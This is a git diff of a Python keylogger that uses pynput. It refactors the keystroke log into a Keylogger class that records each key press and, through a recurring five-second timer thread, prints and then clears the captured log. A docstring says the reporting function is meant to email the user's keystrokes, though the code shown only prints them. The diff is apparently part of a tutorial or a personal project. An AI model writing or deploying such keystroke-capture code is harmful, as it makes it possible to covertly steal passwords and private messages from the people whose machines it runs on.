@@ -4,33 +4,43 @@ Allows us to monitor and control mouse and keyboard.
 import pynput.keyboard
 import threading
 
-log = ""
-
 class Keylogger:
+
+
+    '''
+    Constructor. Executed automatically when object is created.
+    '''
+    def __init__(self):
+        self.log = ""
+
+    '''
+    Append string to the log.
+    '''
+    def append_to_log(self, string):
+        self.log += string
 
     '''
     A callback function. A callback function is a function passed to a method so that the method
     can call the function when the method has completed its work.
     '''
     def process_key_press(self, key):
-        global log  #Using global variable so it is not created every time.
-
         try:
-            log += str(key.char)
+            current_key = str(key.char)
         except AttributeError:  #If the key is not a character then an exception is thrown.fde df
             if key == key.space:
-                log += " "
+                current_key = " "
             else:
-                log += str(key)
+                current_key = " " + str(key) + " "
+
+        self.append_to_log(current_key)
 
     '''
     Function to send an email about the user key strokes. Runs on a separate thread. 
     A function that calls itself is a recursive function.
     '''
     def report(self):
-        global log
-        print(log)
-        log = ""
+        print(self.log)
+        self.log = ""
         timer = threading.Timer(5, self.report)    #After 5 seconds call the function report, runs on a separate thread.
         timer.start()
 
